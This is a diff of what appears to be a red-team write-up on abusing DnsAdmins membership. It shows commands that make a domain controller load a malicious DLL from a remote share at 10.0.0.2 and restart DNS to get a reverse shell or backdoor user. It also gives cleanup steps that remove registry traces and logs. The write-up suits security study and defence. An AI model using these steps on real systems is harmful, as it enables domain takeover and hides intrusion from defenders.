@@ -30,13 +30,11 @@ rundll32.exe .\dnsprivesc.dll,DnsPluginInitialize
 
 Now that we have the DLL and we checked that it is working, we can ask the victim `DC01` to load our malicious DLL \(from the victim controlled network share on host 10.0.0.2\) next time the service starts \(or when the attacker restarts it\):
 
-{% tabs %}
-{% tab title="attacker@victim.memberOfDnsAdmins" %}
+{% code title="attacker@victim.memberOfDnsAdmins" %}
 ```csharp
 dnscmd dc01 /config /serverlevelplugindll \\10.0.0.2\tools\dns-priv\dnsprivesc.dll
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 The below looks promising and suggests the request to load our malicious DLL was successful:
 
@@ -61,14 +59,12 @@ Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name S
 
 Now the next time dns service starts, our malicious DLL should be loaded to the dns.exe process and a reverse shell should be sent back to our attacking system, so let's go and restart the DNS service:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 By this point, I should have received a reverse shell, but unfortunately, I did not.
 
@@ -120,8 +116,7 @@ Below confirms that the dns service is down, however we can still access the DC 
 
 One could think about scripting/automating the after-attack cleanup and the DNS service restoration and include the required code in the same malicious DLL that creates a backdoor user in the first place:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 reg query \\10.0.0.6\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 reg delete \\10.0.0.6\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
@@ -129,8 +124,7 @@ sc.exe \\10.0.0.6 stop dns
 sc.exe \\10.0.0.6 start dns
 //remove any other traces/logs
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-11-23-21-55.png)
 
